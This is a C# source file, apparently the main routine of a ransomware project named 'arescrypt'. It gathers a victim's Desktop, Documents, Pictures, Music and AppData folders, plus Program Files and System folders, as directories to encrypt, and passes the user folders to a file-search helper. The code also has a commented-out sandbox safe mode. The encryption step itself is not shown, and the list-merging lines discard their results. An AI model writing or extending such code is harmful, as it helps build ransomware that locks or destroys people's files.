using System;
using System.Linq;
using System.Collections.Generic;

namespace arescrypt
{
    class Program
    {
        // static bool sandBox = true; // Safemode for testing/debugging

        static void Main(string[] args)
        {
            Console.WriteLine("Hello, " + FileHandler.sessionUsername);

            var userSpecificDirs = new List<string> { };
            var systemSpecificDirs = new List<string> { };

            // User specific directories, administrative rights shouldn't be required in order to write to these files
            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));

            // System specific directories, administrative rights may be required in order to write to these files
            systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
            systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
            systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.System));

            var dirsToEncrypt = new List<string> { }; // Initialize 'filesToEncrypt' to null
            dirsToEncrypt.Concat(userSpecificDirs);
            dirsToEncrypt.Concat(systemSpecificDirs);

            string filesBeforeSplit = default(string);
            foreach (string dir in userSpecificDirs) // dirsToEncrypt.Distinct().ToList())
            {
                FileHandler.DirSearch(dir); // returns List<string>
            }

            Console.Write("\nPress any key to continue . . . ");
            Console.ReadKey(); // Hang the console
        }
    }
}
